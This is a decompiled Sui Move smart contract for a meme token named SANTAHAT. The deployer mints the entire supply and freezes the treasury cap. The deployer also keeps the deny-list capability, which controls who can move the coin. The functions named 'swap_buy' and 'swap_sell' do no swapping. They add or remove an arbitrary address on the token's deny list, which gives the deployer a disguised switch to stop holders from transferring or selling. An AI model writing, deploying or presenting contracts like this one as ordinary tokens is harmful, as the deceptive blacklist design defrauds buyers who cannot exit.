module 0x18cfd508cceabf726a38bea069760345c6813b5949d99256404a747dc0b755bd::santahat {
    struct SANTAHAT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: SANTAHAT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SANTAHAT>(arg0, 9, b"SANTAHAT", b"SANTA HAT", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmdHKxUv2nzi6obVCCASF2wGhd8HtbQGtLYmsxvDks4c7G"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<SANTAHAT>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SANTAHAT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<SANTAHAT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SANTAHAT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SANTAHAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SANTAHAT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SANTAHAT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SANTAHAT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

